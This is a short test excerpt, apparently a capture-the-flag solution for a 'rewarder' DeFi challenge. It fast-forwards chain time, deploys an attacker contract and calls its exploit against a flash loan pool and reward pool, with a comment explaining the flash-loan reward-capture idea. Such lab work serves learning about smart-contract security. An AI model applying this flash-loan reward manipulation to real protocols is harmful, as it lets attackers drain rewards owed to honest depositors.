...
describe('[Challenge] The rewarder', function () {
    ...
    it('Exploit', async function () {
        //Timed exploit we have to wait 5 days to trigger rewards upon depositing money from the flash loan
        await ethers.provider.send('evm_increaseTime', [(5*24*60*60)]);
        const RewarderAttackerFactory = await ethers.getContractFactory('RewarderAttacker', attacker);
        this.attackerContract = await RewarderAttackerFactory.deploy(this.liquidityToken.address);
        await this.attackerContract.exploit(this.flashLoanPool.address, this.rewarderPool.address, this.rewardToken.address, attacker.address);
    });
